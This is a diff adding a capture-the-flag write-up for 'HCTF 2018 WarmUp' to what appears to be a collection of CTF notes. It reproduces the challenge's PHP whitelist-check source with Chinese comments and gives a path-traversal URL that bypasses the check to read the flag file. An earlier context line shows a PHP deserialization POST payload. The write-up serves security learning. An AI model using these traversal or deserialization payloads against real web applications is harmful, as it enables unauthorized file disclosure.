@@ -142,6 +142,57 @@ get:?pleaseget=1
 
 post:pleasepost=2&md51[]=1&md52[]=2&obj=O:3:"BUU":2:{s:7:"correct";s:0:"";s:5:"input";R:2;}
 ```
+## [HCTF 2018]WarmUp
+```
 
+class emmm
+    {
+        public static function checkFile(&$page)
 
+        {
+            //白名单列表
+            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
+            //isset()判断变量是否声明is_string()判断变量是否是字符串 &&用了逻辑与两个值都为真才执行if里面的值
+            if (! isset($page) || !is_string($page)) {
+                echo "you can't see it A";
+                return false;
+            }
+            //检测传进来的值是否匹配白名单列表$whitelist 如果有则执行真
+            if (in_array($page, $whitelist)) {
+                return true;
+            }
+            //过滤问号的函数(如果$page的值有？则从?之前提取字符串)
+            $_page = mb_substr(
+                $page,
+                0,
+                mb_strpos($page . '?', '?')//返回$page.?里卖弄?号出现的第一个位置
+            );
+
+             //第二次检测传进来的值是否匹配白名单列表$whitelist 如果有则执行真
+            if (in_array($_page, $whitelist)) {
+                return true;
+            }
+            //url对$page解码
+            $_page = urldecode($page);
+
+            //第二次过滤问号的函数(如果$page的值有？则从?之前提取字符串)
+            $_page = mb_substr(
+                $_page,
+                0,
+                mb_strpos($_page . '?', '?')
+            );
+            //第三次检测传进来的值是否匹配白名单列表$whitelist 如果有则执行真
+            if (in_array($_page, $whitelist)) {
+                return true;
+            }
+            echo "you can't see it";
+            return false;
+        }
+    }
+    
+```
+
+```
+index.php?file=hint.php?../../../../../ffffllllaaaagggg 
+```
 
